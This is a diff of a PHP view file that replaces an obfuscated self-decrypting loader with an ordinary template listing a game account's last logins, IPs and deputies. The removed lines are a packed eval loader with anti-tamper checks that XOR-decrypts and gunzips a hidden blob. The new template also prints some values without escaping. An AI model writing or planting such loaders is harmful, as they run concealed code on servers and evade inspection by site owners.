@@ -1,24 +1,32 @@
-<?php
-$rlfsceggp="a8ba651bfe8bafad3e41c8cf2be9635d";
-$pqhaherx="020b5a05520d54565e555c520757570704060450515b5752545a5d0f04070006";
-$kutvrqv="G+mdMKVWphQ0jSvqWYFeCa0oBwwPDhXN9pKyXkImEWhL43KZn4HkWnV3/36FtduUu/wBhe8YpaPybO0Kh0E6wo/xuhcmjdOmgiUMC4cVknoe6Mxk0+w7jf/cSPa6BHsKdqs+7SzV86dk+cibuG+1Gg0b2Zi8DhCkfAmuEElVJhZwb4G/DEZtsk/EA6aRReUWBBSi69rcx7GfN6O16412TmCp3xaW6hGysLaorwZa6gLJjwMF62RGG2gmiLvcteB/WhIx16BXRqBAzxoSGmHUipy3uUyWCGsH2au7S4i3JO2/W/hOudW2QU51thhniitcmc235xRO7/ZkdxPBcH7jYH5HPGfxyCT99O9NJczg4611XCP9rEgKIuCAnC4JH/Dc2PQeYefax82EGop6XR6wBKNN/KQKBLx+balJvPwx63TKhoziTaLZE6ujysSeSMnJDFnAdsByJypb1rbJcMUw9RoKgQ==";
-$dqdfvfbe=file_get_contents(__FILE__);
-$imnwabhina=str_replace($kutvrqv,"",$dqdfvfbe);
-if(strpos($imnwabhina,"ec"."ho")!==false||strpos($imnwabhina,"pr"."int")!==false||strpos($imnwabhina,"var_"."dump")!==false||strpos($imnwabhina,"file_put_"."contents")!==false||strpos($imnwabhina,"fw"."rite")!==false){die();}
-$olpwkhtp=str_replace(array($rlfsceggp,$pqhaherx),array("SP_25875412","KP_c67ee2ca"),$dqdfvfbe);
-$zlmjip=md5($olpwkhtp);
-$pwmbeodafk=hex2bin($pqhaherx);
-$secprlfq="";
-$vwvine=strlen($zlmjip);
-for($orjbokrr=0;$orjbokrr<$vwvine;$orjbokrr++){
-$secprlfq.=chr(ord($pwmbeodafk[$orjbokrr])^ord($zlmjip[$orjbokrr]));
-}
-$hwsstqoe=base64_decode($kutvrqv);
-$lqfvzyea=strlen($hwsstqoe);
-$veclsxoo="";
-$krlvzftl=strlen($secprlfq);
-for($orjbokrr=0;$orjbokrr<$lqfvzyea;$orjbokrr++){
-$veclsxoo.=$hwsstqoe[$orjbokrr]^$secprlfq[$orjbokrr%$krlvzftl];
-}
-$qjymyfdjit="gzun"."compress";
-eval('?>' . $qjymyfdjit($veclsxoo) . '<?php ');
+<h3><?= __('screens.settings_logins.title') ?></h3>
+<p><?= __('screens.settings_logins.description') ?></p>
+
+<h4><?= __('screens.settings_logins.last_20_logins') ?></h4>
+
+<table class="vis">
+    <tbody>
+        <tr>
+            <th><?= __('screens.settings_logins.date') ?></th>
+            <th><?= __('screens.settings_logins.ip') ?></th>
+            <th><?= __('screens.settings_logins.deputy') ?></th>
+        </tr>
+        <?php if (!empty($logins)): ?>
+            <?php foreach ($logins as $login): ?>
+                <tr>
+                    <td><?= $login['time'] ?></td>
+                    <td><?= $login['ip'] ?></td>
+                    <td>
+                        <?php if (!empty($login['uv'])): ?>
+                            <a
+                                href="game.php?village=<?= $village['id'] ?>&screen=info_user&id=<?= $login['uv'] ?>"><?= $login['uv_name'] ?></a>
+                        <?php endif; ?>
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+        <?php else: ?>
+            <tr>
+                <td colspan="3"><?= __('screens.settings_logins.no_logins') ?></td>
+            </tr>
+        <?php endif; ?>
+    </tbody>
+</table>
